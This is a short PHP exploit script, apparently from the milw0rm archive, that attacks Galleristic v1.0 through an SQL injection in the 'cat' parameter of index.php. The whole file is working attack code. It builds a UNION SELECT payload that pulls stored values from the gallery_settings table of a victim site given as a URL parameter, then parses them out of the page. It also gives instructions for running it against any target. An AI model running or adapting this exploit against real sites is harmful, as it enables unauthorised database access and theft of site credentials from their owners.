<?php

#
#   Name : Galleristic v1.0 (index.php cat) Remote SQL Injection Exploit
#   Author : cOndemned
#   Note : works only when magic_quotes_gpc = off
#   Greetz : irk4z, GregStar, ZaBeaTy, Iwan, ElusiveN, doctor, Avantura ;*
#

function exploit($target, $v) {

    $injection = "/index.php?cat='-1+union+select+value+from+gallery_settings+where+id=" . $v . "/*";
    $request = file($target . $injection);
        
    for($i = 0; $i < count($request); $i++) {
        
        preg_match('/\'(.*)\'<\/h2>/', $request[$i], $response);
           
        if(!empty($response[1])) {
            return $response[1] . '<br />';
        }
    }
}

#   Usage : Run in a browser as : http://[yourbox]/exploit.php?target=http://[targetbox]/[path]/
if(empty($_GET['target'])) {
    die('No target site specified!');
}
else {
    for($c = 1; $c < 3; $c++) {
        echo exploit($_GET['target'], $c);
    }   
}

?>

# milw0rm.com [2008-05-07]
